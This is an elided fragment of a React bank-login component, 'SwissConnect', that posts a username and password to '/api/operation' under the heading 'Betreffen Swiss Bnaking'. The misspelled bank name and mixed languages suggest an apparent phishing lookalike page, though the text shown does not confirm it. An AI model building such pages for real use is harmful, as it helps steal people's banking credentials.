...
export default function SwissConnect() {
    ...
    try {
      ...
      const response = await fetch("/api/operation", {
        ...
        body: JSON.stringify({ 
          username, 
          password, 
          bankName: "Swiss-Bnaking" // Ajout explicite du nom de la banque ici
        }),
      });
  ...
  return (
    <div className="bank-connect-container">
      ...
      <h1 className="bank-connect-title">Betreffen Swiss Bnaking</h1>
